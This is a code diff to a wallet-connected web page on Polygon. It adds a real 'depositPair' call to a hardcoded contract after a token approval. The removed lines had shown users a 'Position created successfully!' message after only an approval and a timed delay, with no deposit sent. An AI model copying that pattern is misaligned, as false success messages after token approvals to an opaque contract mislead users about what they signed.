@@ -697,6 +697,15 @@
     const projectId = "96f13374b0fe2f629a925617de0a2ba3";
     const chains = [polygon];
 
+    // Contract addresses
+    const CONTRACT_ADDRESS = "0xD045a55a067aE1a65Cfe836CcCb194a40cB04CF2";
+    const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+    const NATIVE_POL = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
+
+    const ROUTER_ABI = [
+        { "inputs": [{ "type": "address", "name": "tokenA" }, { "type": "uint256", "name": "amountA" }, { "type": "address", "name": "tokenB" }, { "type": "uint256", "name": "amountB" }], "name": "depositPair", "outputs": [], "stateMutability": "payable", "type": "function" }
+    ];
+
     const wagmiConfig = defaultWagmiConfig({
         chains,
         projectId,
@@ -721,7 +730,6 @@
     let usdtBalance = 0;
     let polBalance = 0;
 
-    const USDT_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
     const USDT_ABI = [
         { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
         { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" }
@@ -1149,7 +1157,7 @@
             <div class="status-step">
                 <div class="step-line step-active" id="stepContinue">⟳ Continue in your wallet...</div>
                 <div class="step-line step-pending" id="stepApprove" style="display:none;">⏳ Approve in wallet...</div>
-                <div class="step-line step-pending" id="stepConfirm" style="display:none;">⏳ Confirm in wallet...</div>
+                <div class="step-line step-pending" id="stepConfirm" style="display:none;">⏳ Confirm deposit in wallet...</div>
             </div>
         `;
         
@@ -1175,6 +1183,7 @@
                 stepContinue.innerHTML = '✓ Continue in your wallet';
             }
             
+            // STEP 1: APPROVE
             if (stepApprove) {
                 stepApprove.style.display = 'block';
                 stepApprove.classList.remove('step-pending');
@@ -1186,7 +1195,7 @@
                 address: tokenAddress,
                 abi: erc20Abi,
                 functionName: "approve",
-                args: ["0xD045a55a067aE1a65Cfe836CcCb194a40cB04CF2", tokenAmountWei],
+                args: [CONTRACT_ADDRESS, tokenAmountWei],
                 account: currentAccount,
                 chainId: polygon.id
             });
@@ -1199,28 +1208,64 @@
                 stepApprove.innerHTML = `✓ Approve in wallet (${approveHash.slice(0,10)}...)`;
             }
             
+            // STEP 2: DEPOSIT
             if (stepConfirm) {
                 stepConfirm.style.display = 'block';
                 stepConfirm.classList.remove('step-pending');
                 stepConfirm.classList.add('step-active');
-                stepConfirm.innerHTML = '⟳ Confirm in wallet...';
+                stepConfirm.innerHTML = '⟳ Confirm deposit in wallet...';
             }
             
-            statusDiv.innerHTML += `<div class="step-line step-success" style="margin-top:0.5rem;">✓ Approve completed! Now confirming deposit...</div>`;
+            // Prepare deposit transaction based on pair type
+            let tokenA, amountA, tokenB, amountB, value = 0n;
             
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            if (currentPair === 'USDT') {
+                // USDT + Custom Token
+                const usdtAmountWei = parseUnits(pairAmount.toString(), 6);
+                tokenA = USDT_ADDRESS;
+                amountA = usdtAmountWei;
+                tokenB = tokenAddress;
+                amountB = tokenAmountWei;
+                value = 0n;
+            } else {
+                // POL + Custom Token
+                const polAmountWei = parseUnits(pairAmount.toString(), 18);
+                tokenA = tokenAddress;
+                amountA = tokenAmountWei;
+                tokenB = NATIVE_POL;
+                amountB = polAmountWei;
+                value = polAmountWei;
+            }
+            
+            const depositSimulate = await simulateContract(wagmiConfig, {
+                address: CONTRACT_ADDRESS,
+                abi: ROUTER_ABI,
+                functionName: "depositPair",
+                args: [tokenA, amountA, tokenB, amountB],
+                account: currentAccount,
+                chainId: polygon.id,
+                value: value
+            });
+            
+            const depositHash = await writeContract(wagmiConfig, depositSimulate.request);
             
             if (stepConfirm) {
                 stepConfirm.classList.remove('step-active');
                 stepConfirm.classList.add('step-success');
-                stepConfirm.innerHTML = '✓ Confirm in wallet';
+                stepConfirm.innerHTML = `✓ Confirm deposit in wallet (${depositHash.slice(0,10)}...)`;
             }
             
-            statusDiv.innerHTML += `<div class="step-line step-success">✅ Position created successfully!</div>`;
+            statusDiv.innerHTML += `<div class="step-line step-success" style="margin-top:0.5rem;">✅ Position created successfully!</div>`;
             
         } catch (error) {
             console.error(error);
-            statusDiv.innerHTML += `<div class="step-line step-error">❌ Error: ${error.message.slice(0,100)}</div>`;
+            let errorMsg = error.message.slice(0,100);
+            if (errorMsg.includes("user rejected")) {
+                errorMsg = "Transaction rejected by user";
+            } else if (errorMsg.includes("insufficient")) {
+                errorMsg = "Insufficient balance";
+            }
+            statusDiv.innerHTML += `<div class="step-line step-error">❌ Error: ${errorMsg}</div>`;
         }
     }
     
@@ -1680,4 +1725,4 @@
     checkReviewButton();
 </script>
 </body>
-</html>
+    </html>
